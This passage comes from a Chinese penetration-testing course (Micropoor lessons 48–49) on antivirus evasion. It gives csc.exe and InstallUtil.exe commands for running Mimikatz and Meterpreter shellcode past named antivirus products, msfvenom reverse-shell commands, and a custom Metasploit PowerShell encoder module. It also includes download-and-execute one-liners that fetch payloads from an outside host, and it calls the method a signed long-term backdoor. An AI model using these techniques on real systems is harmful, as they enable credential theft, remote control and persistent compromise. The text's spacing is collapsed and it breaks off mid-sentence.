盘，那么你可以在 C:\WINNT\Microsoft.NET\Framework\xxxxx 目录中发现它。为了使用方便，
你可以手动把这个目录添加到Path环境变量中去。用Csc.exe编译HelloWorld.cs非常简
单，打开命令提示符，并切换到存放test.cs文件的目录中，输入下列行命令: csc/target:exe
test.cs 将Ttest.cs编译成名为test.exe的console应用程序
1. //test.cs
2. usingSystem;
3. classTestApp
4. {
5. publicstaticvoidMain()
6. {
7. Console.WriteLine("Micropoor!");
8. }
9. }
微软官方介绍如下：
TheInstallertoolisacommand-lineutilitythatallowsyoutoinstalland
uninstallserverresourcesbyexecutingtheinstallercomponentsinspecified
assemblies.Thistoolworksinconjunctionwithclassesinthe
System.Configuration.Installnamespace.
ThistoolisautomaticallyinstalledwithVisualStudio.Torunthetool,usethe
DeveloperCommandPrompt(ortheVisualStudioCommandPromptinWindows7).For
moreinformation,seeCommandPrompts.
https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-
tool
介绍相关概念：
csc.exe：
InstallUtil.exe：
第四十八课：payload分离免杀思路第二季
-313-
本文档使用书栈(BookStack.CN)构建
关于两个文件默认安装位置：（注意x32，x64区别）
1. C:\Windows\Microsoft.NET\Framework\
2. C:\Windows\Microsoft.NET\Framework64\
3. C:\Windows\Microsoft.NET\Framework\
4. C:\Windows\Microsoft.NET\Framework64\
文章采取2种demo来辅助本文中心思想。
以抓密码为例：测试环境：目标A机安装了360套装。目标机B安装了小红伞，NOD32。目标机安
C装了麦咖啡。
生成秘钥：
执行：
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
/r:System.EnterpriseServices.dll/r:System.IO.Compression.dll/target:library
/out:Micropoor.exe/keyfile:C:\Users\Johnn\Desktop\installutil.snk/unsafe
2. C:\Users\Johnn\Desktop\mimi.cs
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe/logfile=
/LogToConsole=false/UC:\Users\Johnn\Desktop\Micropoor.exe
demo1：
第四十八课：payload分离免杀思路第二季
-314-
本文档使用书栈(BookStack.CN)构建
以msf为例：
生成shllcode
1. msfvenom--platformWindows-ax64-pwindows/x64/meterpreter/reverse_tcp_uuid
LHOST=192.168.1.5LPORT=8080-b'\x00'-ex64/xor-i10-fcsharp-o
./Micropoor.txt
demo2：
第四十八课：payload分离免杀思路第二季
-315-
本文档使用书栈(BookStack.CN)构建
替换shellcode。
第四十八课：payload分离免杀思路第二季
-316-
本文档使用书栈(BookStack.CN)构建
编译：
1. C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe/unsafe/platform:x64
/out:Micropoor.exeM.cs
运行：
第四十八课：payload分离免杀思路第二季
-317-
本文档使用书栈(BookStack.CN)构建
1. C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe/logfile=
/LogToConsole=false/UMicropoor.exe
注：在实际测试的过程，起监听需要配置一些参数，防止假死与假session。
1. msfexploit(multi/handler)>setexitonsessionfalse
2. exitonsession=>false
3. msfexploit(multi/handler)>setEnableStageEncodingtrue
4. EnableStageEncoding=>true
5. msfexploit(multi/handler)>
6. msfexploit(multi/handler)>setStageencoderx64/xor
7. Stageencoder=>x64/xor
8. msfexploit(multi/handler)>setstageencodingfallbackfalse
9. stageencodingfallback=>false
10. msfexploit(multi/handler)>exploit-j-z
上线：
第四十八课：payload分离免杀思路第二季
-318-
本文档使用书栈(BookStack.CN)构建
mimi.cs953.71KB
shllcode.cs
后者的话：该方法可以做一个带签名的长期后门。
Micropoor
第四十八课：payload分离免杀思路第二季
-319-
本文档使用书栈(BookStack.CN)构建
知识点介绍：
WindowsPowerShell是以.NETFramework技术为基础，并且与现有的WSH保持向后兼容，因此它
的脚本程序不仅能访问.NETCLR，也能使用现有的COM技术。同时也包含了数种系统管理工具、简易
且一致的语法，提升管理者处理，常见如登录数据库、WMI。ExchangeServer2007以及System
CenterOperationsManager2007等服务器软件都将内置WindowsPowerShell。Windows
PowerShell的强大，并且内置，在渗透过程中，也让渗透变得更加有趣。而安全软件的对抗查杀也逐
渐开始针对powershell的一切行为。在https://technet.microsoft.com，看到文档如下：
Hereisalistingoftheavailablestartupparameters:
-CommandSpecifiesthecommandtexttoexecuteasthoughitweretypedatthe
PowerShellcommandprompt.
-EncodedCommandSpecifiesthebase64-encodedcommandtexttoexecute.
-ExecutionPolicySetsthedefaultexecutionpolicyfortheconsolesession.
-FileSetsthenameofascriptfiletoexecute.
-InputFormatSetstheformatfordatasenttoPowerShellaseithertextstringor
serializedXML.ThedefaultformatisXML.ValidvaluesaretextandXML.
-NoExitDoesnotexitafterrunningstartupcommands.Thisparameterisuseful
whenyourunPowerShellcommandsorscriptsviathecommandprompt(cmd.exe).
-NoLogoStartsthePowerShellconsolewithoutdisplayingthecopyrightbanner.
-NoninteractiveStartsthePowerShellconsoleinnon-interactivemode.Inthis
mode,PowerShelldoesnotpresentaninteractiveprompttotheuser.
-NoProfileTellsthePowerShellconsolenottoloadthecurrentuser’sprofile.
-OutputFormatSetstheformatforoutputaseithertextstringorserializedXML.
Thedefaultformatistext.ValidvaluesaretextandXML.
-PSConsoleFileLoadsthespecifiedWindowsPowerShellconsolefile.Consolefiles
endwiththe.psc1extensionandcanbeusedtoensurethatspecificsnap-in
extensionsareloadedandavailable.YoucancreateaconsolefileusingExport-
ConsoleinWindowsPowerShell.
-StaStartsPowerShellinsingle-threadedmode.
-VersionSetstheversionofWindowsPowerShelltouseforcompatibility,suchas
1.0.
-WindowStyleSetsthewindowstyleasNormal,Minimized,Maximized,orHidden.The
defaultisNormal.
针对它的特性，本地测试：
Add-Type-AssemblyNamePresentationFramework;
[System.Windows.MessageBox]::Show(‘Micropoor’)
第四十九课：关于Powershell对抗安全软件
-320-
本文档使用书栈(BookStack.CN)构建
上文所说，越来越多的杀软开始对抗，powershell的部分行为，或者特征。以msfvenom为例，生成
payload。
micropoor.ps1不幸被杀。
针对powershell特性，更改payload
第四十九课：关于Powershell对抗安全软件
-321-
本文档使用书栈(BookStack.CN)构建
接下来考虑的事情是如何把以上重复的工作变成自动化，并且针对powershell，DownloadString特
性，设计出2种payload形式：
（1）目标机出网
（2）目标机不出网
并且根据需求，无缝连接Metasploit。
根据微软文档，可以找到可能对以上有帮助的属性，分别为：
Window
Style
NoExitEncodedCommand
exec
自动化实现如下：
第四十九课：关于Powershell对抗安全软件
-322-
本文档使用书栈(BookStack.CN)构建
1. #copybase64.rbtometasploit-
framework/embedded/framework/modules/encoders/powershell.Ifpowershellis
empty,mkdirpowershell.
2. #E.g
3. #msfencoder(powershell/base64)>useexploit/multi/handler
4. #msfexploit(multi/handler)>setpayloadwindows/x64/meterpreter/reverse_tcp
5. #payload=>windows/x64/meterpreter/reverse_tcp
6. #msfexploit(multi/handler)>exploit
7. #msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=xx.xx.xx.xxLPORT=xx-f
psh-reflection--archx64--platformwindows|msfvenom-epowershell/base64--
archx64--platformwindows.
8. #[*]StartedreverseTCPhandleronxx.1xx.xx.xx:xx
9.
10. classMetasploitModule'PowershellBase64Encoder',
16. 'Description'=>%q{
17. msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=xx.xx.xx.xxLPORT=xx
18. -fpsh-reflection--archx64--platformwindows|msfvenom-e
19. powershell/base64--archx64--platformwindows.
20. },
21. 'Author'=>'Micropoor',
22. 'Arch'=>ARCH_CMD,
23. 'Platform'=>'win')
24.
25. register_options([
26. OptBool.new('payload',[false,'Usepayload',false]),
27. OptBool.new('x64',[false,'Usesyswow64powershell',false])
28. ])
29.
30. end
31.
32. defencode_block(state,buf)
33. base64=Rex::Text.encode_base64(Rex::Text.to_unicode(buf))
34. cmd=''
35. ifdatastore['x64']
36. cmd+='c:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
37. else
38. cmd+='powershell.exe'
第四十九课：关于Powershell对抗安全软件
-323-
本文档使用书栈(BookStack.CN)构建
39. end
40. ifdatastore['payload']
41. cmd+='-windowstylehidden-execbypass-NoExit'
42. end
43. cmd+="-EncodedCommand\#{base64}"
44. end
45. end
46.
47. #ifusecaidao
48. #executeechopowershell-windowstylehidden-execbypass-c\""IEX(New-
Object
Net.WebClient).DownloadString('http://192.168.1.117/xxx.ps1');\""|msfvenom-e
x64/xor4--archx64--platformwindows
49. #xxx.ps1ismsfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=xx.xx.xx.xx
LPORT=xx-fpsh-reflection--archx64--platformwindows|msfvenom-e
powershell/base64--archx64--platformwindows.
copypowershell_base64.rbtometasploit‐
framework/embedded/framework/modules/encoders/powershell.Ifpowershellis
empty,mkdirpowershell.
参数payload选择是否使用Metasploitpayload，来去掉powershell的关键字。
例1（目标出网，下载执行）：
1. echopowershell‐windowstylehidden‐execbypass‐c\""IEX(New‐
ObjectNet.WebClient).DownloadString('http://192.168.1.117/micropoor.ps1');\""|msfvenom
‐epowershell/base64‐‐archx64‐‐platformwindows
第四十九课：关于Powershell对抗安全软件
-324-
本文档使用书栈(BookStack.CN)构建
例2（目标不出网，本地执行）
1. msfvenom‐pwindows/x64/meterpreter/reverse_tcpLHOST=192.168.1.117LPORT=8080
‐fpsh‐reflection‐‐archx64‐‐platformwindows|msfvenom‐epowershell/base64
‐‐archx64‐‐platformwindowspayload
更多有趣的实验：
把例1的down内容更改为例2，并且去掉payload参数。来减小payload大小。
更改Invoke-Mimikatz.ps1等。
注：加payload参数
第四十九课：关于Powershell对抗安全软件
-325-
本文档使用书栈(BookStack.CN)构建
Micropoor
第四十九课：关于Powershell对抗安全软件
-326-
本文档使用书栈(BookStack.CN)构建
从xp开始默认有.netframework,在powershell后，调用起来更方便。
System.Data.SqlClient命名空间是用于SQLServer的.NET数据提供程序。在net
framework2.0中新增加SqlDataSourceEnumerator类。提供了一种枚举本地网络内的所有可用
SQLServer实例机制。微软官方是这样解释的：
SQLServer2000和SQLServer2005进行应用程序可以确定在当前网络中的SQLServer实例存